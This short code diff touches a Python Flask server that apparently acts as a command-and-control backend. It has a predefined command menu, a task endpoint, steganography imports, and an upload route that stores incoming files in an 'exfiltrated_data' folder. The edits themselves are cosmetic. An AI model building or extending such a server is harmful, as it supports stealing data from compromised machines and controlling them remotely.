@@ -3,7 +3,6 @@ import os
 from queue import *
 from stegano import lsb
 
-
 app = Flask(__name__)
 
 # Predefined command menu
@@ -54,7 +53,6 @@ def get_task():
 @app.route('/upload', methods=['POST'])
 def receive_data():
     file = request.files.get('file')
-    print(request.files)
     if file:
         filename = file.filename
         save_path = os.path.join('exfiltrated_data', filename)
@@ -70,7 +68,7 @@ def receive_data():
         print(deobfuscated_data)
         
         return jsonify({"Success": "Yay"}), 200
-        
+
     else:
         return jsonify({"error": "No file provided"}), 400
     
